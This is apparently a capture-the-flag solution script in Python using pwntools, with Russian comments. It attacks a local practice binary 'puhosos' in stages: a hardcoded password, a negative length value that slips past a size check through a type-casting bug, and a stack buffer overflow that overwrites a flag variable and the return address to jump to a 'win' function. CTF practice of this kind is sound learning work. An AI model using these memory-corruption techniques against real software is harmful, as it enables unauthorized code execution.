from pwn import *

env = {'FLAG': 'CTF{local_testing_flag_for_puhosos}'}
p = process('./puhosos', env=env)

elf = ELF('./puhosos')
rop_elf = ROP(elf)

print("[*] Этап 1: Прохождение проверки пароля")
p.recvuntil(b"Enter puhosos-password: ")
p.sendline(b"SuperPuhosos")

print("[*] Этап 2: Эксплуатация Type Casting")
p.recvuntil(b"Enter length of puhosos-name (<=32): ")
p.sendline(b"-156")

print("[*] Этап 3: Эксплуатация Buffer Overflow и перехват RIP")
p.recvuntil(b"Enter puhosos-name: ")

payload = b"A" * 32         # 1. Заполняем буфер (32 байта)
payload += p32(1)           # 2. Перезаписываем is_chief
payload += b"B" * 12        # 3. Добиваем 4 байта выравнивания + 8 байт RBP

ret_address = rop_elf.find_gadget(['ret'])[0]
payload += p64(ret_address)
payload += p64(ret_address) # Выравнивание стека 2 раза, потому что один не работало

payload += p64(elf.symbols['win'])

p.sendline(payload)

p.interactive()